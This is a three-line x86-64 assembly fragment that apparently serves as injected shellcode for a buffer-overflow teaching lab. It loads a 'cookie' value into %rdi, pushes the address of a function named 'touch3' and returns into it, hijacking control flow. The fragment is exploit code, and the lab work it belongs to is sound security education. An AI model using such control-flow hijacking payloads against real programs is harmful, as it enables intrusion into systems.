movq  $0x5561dca8, %rdi  # cookie
pushq $0x4018fa          # addr of `touch3`
ret                      # return to `touch3`